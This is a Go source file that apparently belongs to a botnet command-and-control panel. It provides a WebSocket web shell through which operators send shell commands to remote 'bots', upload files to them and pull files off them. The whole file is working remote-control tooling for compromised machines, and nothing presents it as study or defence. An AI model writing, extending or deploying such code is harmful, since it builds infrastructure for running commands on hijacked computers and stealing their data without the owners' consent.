package main

import (
	"encoding/json"
	"net/http"
	"strings"
	"sync"

	"github.com/gorilla/websocket"
)

// ============================================================================
// WEB SHELL WEBSOCKET
// Provides real-time bidirectional shell access to bots via WebSocket.
// Web panel users click a bot row to open a terminal modal that connects here.
// ============================================================================

var upgrader = websocket.Upgrader{
	ReadBufferSize:  16 * 1024,        // 16KB read buffer (control frames & small commands)
	WriteBufferSize: 512 * 1024,       // 512KB write buffer (for file download payloads)
	CheckOrigin: func(r *http.Request) bool {
		// Only allow same-origin WebSocket connections
		origin := r.Header.Get("Origin")
		if origin == "" {
			return true // non-browser clients (curl, etc.) don't send Origin
		}
		host := r.Host
		// Accept if origin matches the request host
		return strings.HasSuffix(origin, "://"+host)
	},
}

// safeWS wraps a websocket.Conn with a mutex for write serialization.
// gorilla/websocket requires that concurrent writes are serialized.
type safeWS struct {
	conn *websocket.Conn
	mu   sync.Mutex
}

func (s *safeWS) writeJSON(v interface{}) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.conn.WriteJSON(v)
}

// fileAccum holds in-progress file download state per bot
type fileAccum struct {
	name string
	data strings.Builder
}

var (
	webShellConns     = make(map[string][]*safeWS)
	webShellConnsLock sync.RWMutex

	// webShellCwd tracks the working directory per bot for web shell sessions.
	webShellCwd     = make(map[string]string)
	webShellCwdLock sync.RWMutex

	// webShellPendingCd tracks bots that have a cd+pwd in flight.
	// When the next output arrives and is an absolute path, update cwd.
	webShellPendingCd     = make(map[string]bool)
	webShellPendingCdLock sync.Mutex

	// webShellFileAccum tracks in-progress file downloads per bot.
	webShellFileAccum     = make(map[string]*fileAccum)
	webShellFileAccumLock sync.Mutex
)

func registerWebShell(botID string, ws *safeWS) {
	webShellConnsLock.Lock()
	defer webShellConnsLock.Unlock()
	webShellConns[botID] = append(webShellConns[botID], ws)
}

func unregisterWebShell(botID string, ws *safeWS) {
	webShellConnsLock.Lock()
	defer webShellConnsLock.Unlock()
	conns := webShellConns[botID]
	for i, c := range conns {
		if c == ws {
			webShellConns[botID] = append(conns[:i], conns[i+1:]...)
			break
		}
	}
	if len(webShellConns[botID]) == 0 {
		delete(webShellConns, botID)
	}
}

// forwardBotOutputToWebShells sends output to all web shell connections for a bot.
// No-ops when no connections exist (zero overhead when unused).
// Intercepts __FILE_START__/__FILE_END__ markers for file download transfer.
func forwardBotOutputToWebShells(botID, output string) {
	// If a cd+pwd is pending, capture the resolved path to update cwd
	webShellPendingCdLock.Lock()
	pending := webShellPendingCd[botID]
	if pending {
		delete(webShellPendingCd, botID)
	}
	webShellPendingCdLock.Unlock()
	if pending {
		resolved := strings.TrimSpace(output)
		if strings.HasPrefix(resolved, "/") && !strings.Contains(resolved, "\n") {
			webShellCwdLock.Lock()
			webShellCwd[botID] = resolved
			webShellCwdLock.Unlock()
		}
	}

	// --- File transfer marker detection ---
	trimmed := strings.TrimSpace(output)

	// Check for __FILE_START__<filename>
	if strings.HasPrefix(trimmed, "__FILE_START__") {
		fname := strings.TrimPrefix(trimmed, "__FILE_START__")
		webShellFileAccumLock.Lock()
		webShellFileAccum[botID] = &fileAccum{name: fname}
		webShellFileAccumLock.Unlock()
		// Send a small status message to the terminal
		sendWebShellOutput(botID, "[download] receiving file: "+fname+"...\n")
		return
	}

	// Check for __FILE_END__
	if trimmed == "__FILE_END__" {
		webShellFileAccumLock.Lock()
		accum := webShellFileAccum[botID]
		delete(webShellFileAccum, botID)
		webShellFileAccumLock.Unlock()

		if accum != nil {
			// Send file message to all web shell connections
			sendWebShellFile(botID, accum.name, accum.data.String())
		}
		return
	}

	// If we are accumulating a file, append data instead of displaying
	webShellFileAccumLock.Lock()
	accum := webShellFileAccum[botID]
	webShellFileAccumLock.Unlock()
	if accum != nil {
		webShellFileAccumLock.Lock()
		accum.data.WriteString(trimmed)
		webShellFileAccumLock.Unlock()
		return
	}

	// --- Normal output path ---
	sendWebShellOutput(botID, output)
}

// sendWebShellOutput sends a normal output message to all web shell connections for a bot.
func sendWebShellOutput(botID, output string) {
	webShellConnsLock.RLock()
	conns := webShellConns[botID]
	if len(conns) == 0 {
		webShellConnsLock.RUnlock()
		return
	}
	snapshot := make([]*safeWS, len(conns))
	copy(snapshot, conns)
	webShellConnsLock.RUnlock()

	msg := map[string]string{
		"type":   "output",
		"botID":  botID,
		"output": output,
	}

	var dead []*safeWS
	for _, ws := range snapshot {
		if err := ws.writeJSON(msg); err != nil {
			dead = append(dead, ws)
		}
	}
	for _, ws := range dead {
		unregisterWebShell(botID, ws)
		ws.conn.Close()
	}
}

// sendWebShellFile sends a completed file download to all web shell connections for a bot.
func sendWebShellFile(botID, filename, b64data string) {
	webShellConnsLock.RLock()
	conns := webShellConns[botID]
	if len(conns) == 0 {
		webShellConnsLock.RUnlock()
		return
	}
	snapshot := make([]*safeWS, len(conns))
	copy(snapshot, conns)
	webShellConnsLock.RUnlock()

	msg := map[string]string{
		"type": "file",
		"name": filename,
		"data": b64data,
	}

	var dead []*safeWS
	for _, ws := range snapshot {
		if err := ws.writeJSON(msg); err != nil {
			dead = append(dead, ws)
		}
	}
	for _, ws := range dead {
		unregisterWebShell(botID, ws)
		ws.conn.Close()
	}

	// Also send a status message to the terminal
	sendWebShellOutput(botID, "[download] file ready: "+filename+"\n")
}

// handleWebShellWS is the WebSocket endpoint for the remote shell modal.
// Auth enforced by requireWebAuth middleware in NewWebMux.
func handleWebShellWS(w http.ResponseWriter, r *http.Request) {
	botID := strings.TrimSpace(r.URL.Query().Get("botID"))
	if botID == "" {
		http.Error(w, "Missing botID", http.StatusBadRequest)
		return
	}

	// Resolve full bot ID (supports prefix matching)
	bot := findBotByID(botID)
	if bot == nil {
		http.Error(w, "Bot not found", http.StatusNotFound)
		return
	}
	botID = bot.botID

	wsConn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}

	// Allow up to 16MB messages for file uploads (10MB file = ~13.3MB base64 + JSON overhead)
	wsConn.SetReadLimit(16 * 1024 * 1024)

	ws := &safeWS{conn: wsConn}
	registerWebShell(botID, ws)
	// Reset cwd for fresh shell session
	webShellCwdLock.Lock()
	delete(webShellCwd, botID)
	webShellCwdLock.Unlock()
	defer func() {
		unregisterWebShell(botID, ws)
		wsConn.Close()
	}()

	// Read loop: receive commands from the web shell
	for {
		_, msgBytes, err := wsConn.ReadMessage()
		if err != nil {
			break
		}

		var msg struct {
			Command  string `json:"command"`
			Type     string `json:"type"`
			FileName string `json:"fileName"`
			Data     string `json:"data"`
		}
		if err := json.Unmarshal(msgBytes, &msg); err != nil {
			continue
		}

		// Handle file upload from browser
		if msg.Type == "upload" && msg.FileName != "" && msg.Data != "" {
			uploadCmd := "!upload " + msg.FileName + " " + msg.Data
			sendToSingleBot(botID, uploadCmd)
			continue
		}

		cmd := strings.TrimSpace(msg.Command)
		if cmd == "" {
			continue
		}

		// Auto-prefix with !shell for non-! commands (mirrors TUI behavior)
		if !strings.HasPrefix(cmd, "!") {
			// Track cd commands to maintain working directory across stateless shells
			if strings.HasPrefix(cmd, "cd ") || cmd == "cd" {
				dir := strings.TrimSpace(strings.TrimPrefix(cmd, "cd"))
				if dir == "" || dir == "~" {
					dir = "$HOME"
				}
				// Build the cd command with current cwd context
				webShellCwdLock.RLock()
				cur := webShellCwd[botID]
				webShellCwdLock.RUnlock()
				// Let the shell resolve the real path via pwd, don't do string concat
				var cdCmd string
				if cur != "" {
					cdCmd = "cd " + shellQuote(cur) + " && cd " + shellQuote(dir) + " && pwd"
				} else {
					cdCmd = "cd " + shellQuote(dir) + " && pwd"
				}
				cmd = "!shell " + cdCmd
				// Mark that we're waiting for pwd output to update cwd
				webShellPendingCdLock.Lock()
				webShellPendingCd[botID] = true
				webShellPendingCdLock.Unlock()
			} else {
				// Prepend cd to tracked cwd for stateless shell
				webShellCwdLock.RLock()
				cwd := webShellCwd[botID]
				webShellCwdLock.RUnlock()
				if cwd != "" {
					cmd = "!shell cd " + shellQuote(cwd) + " && " + cmd
				} else {
					cmd = "!shell " + cmd
				}
			}
		}

		// For !download with relative paths, prepend tracked cwd
		if strings.HasPrefix(cmd, "!download ") {
			parts := strings.SplitN(cmd, " ", 2)
			if len(parts) == 2 && parts[1] != "" && !strings.HasPrefix(parts[1], "/") {
				webShellCwdLock.RLock()
				cwd := webShellCwd[botID]
				webShellCwdLock.RUnlock()
				if cwd != "" {
					cmd = "!download " + cwd + "/" + parts[1]
				}
			}
		}

		sendToSingleBot(botID, cmd)
	}
}

// shellQuote wraps a path in single quotes for safe shell interpolation.
// $HOME is left unquoted so the shell expands it.
func shellQuote(s string) string {
	if s == "$HOME" {
		return s
	}
	return "'" + strings.ReplaceAll(s, "'", "'\"'\"'") + "'"
}
